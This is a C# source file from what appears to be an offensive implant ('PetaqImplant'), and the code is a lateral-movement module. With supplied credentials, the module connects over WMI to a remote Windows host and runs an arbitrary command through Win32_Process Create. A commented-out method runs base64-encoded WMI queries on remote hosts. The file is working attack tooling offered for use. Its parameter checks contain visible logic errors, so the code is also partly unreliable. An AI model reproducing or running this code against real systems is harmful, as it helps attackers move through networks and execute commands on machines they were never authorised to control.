using System;
using System.Text;
using System.Linq;
using System.Management;
using System.Collections.Generic;


namespace PetaqImplant 
{
    public class LateralMovementWMI : LateralMovement
    {
        public LateralMovementWMI()
        {
        }

        public override bool Execute()
        {
            // get connection options from System.Management
            ConnectionOptions options = new ConnectionOptions();

            // check the username and password
            if (! coptions.ContainsKey("host") && coptions.ContainsKey("command"))
            {
                
                Console.WriteLine("Missing host or command parameters.");
                return false;
            }
            // define a scope for management
            ManagementScope scope;

            if (coptions.ContainsKey("username"))
            {
                // set parameters
                options.Username = coptions["domainuser"];
                options.Password = coptions["password"];
                // define a scope for management
                scope = new ManagementScope(String.Format("\\\\{0}\\root\\cimv2", coptions["host"]), options);
            }
            else
            {
                // define a scope for management
                scope = new ManagementScope(String.Format("\\\\{0}\\root\\cimv2", coptions["host"]));

            }

            try
            {
                // connect to the scope
                scope.Connect();

                // use Win32_Process for now, implement other in "technique"
                var win32_Process = new ManagementClass(scope, new ManagementPath("Win32_Process"), new ObjectGetOptions());

                // get parameters for Create method in Win32_Process
                ManagementBaseObject parameters = win32_Process.GetMethodParameters("Create");

                // set the command for the Commandline in Win32_Process 
                PropertyDataCollection properties = parameters.Properties;
                parameters["CommandLine"] = coptions["command"];

                // invoke the Create method
                ManagementBaseObject output = win32_Process.InvokeMethod("Create", parameters, null);

                Console.WriteLine("Win32_Process Create Output: " + output["returnValue"].ToString());
                
                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine("Lateral Movement Exception:" + e.Message);
            }
            return false;
        }
        //public bool Query()
        //{

        //    // get connection options from System.Management
        //    ConnectionOptions options = new ConnectionOptions();

        //    // check the username and password
        //    if (! coptions.ContainsKey("domainuser") && coptions.ContainsKey("password")
        //        && coptions.ContainsKey("host") && coptions.ContainsKey("query"))
        //    {
        //        Console.WriteLine("Missing WMI query parameters.");
        //        return false;
        //    }

        //    // set parameters
        //    options.Username = coptions["domainuser"];
        //    options.Password = coptions["password"];
        //    SelectQuery query = new SelectQuery(Encoding.UTF8.GetString(Convert.FromBase64String(coptions["query"])));

        //    // define a scope for management
        //    ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\root\\cimv2", coptions["host"]), options);

        //    try
        //    {
        //        // connect to the scope
        //        scope.Connect();

        //        // get a new management object searcher
        //        ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);

        //        //execute the query
        //        ManagementObjectCollection results = searcher.Get();
        //        if (results.Count <= 0)
        //        {
        //            Console.WriteLine(results);
        //        }
        //        else
        //        {
        //            Console.WriteLine("No results.");
        //            foreach (ManagementObject r in results)
        //            {
        //                // print results
        //                r.Get();
        //                PropertyDataCollection rproperties = r.Properties;
        //                Console.WriteLine("Result:\n{0}", rproperties);
        //                //foreach (var rp in rproperties)
        //                //{
        //                //    Console.WriteLine("Property:{0}\tValue:{1}", rp.Key, rp.Value);
        //                //}

        //            }
        //        }

        //        return true;
        //    }
        //    catch (Exception e)
        //    {
        //        Console.WriteLine("Lateral Movement Exception:" + e.Message);
        //    }
        //    return false;
        //}
    }
}
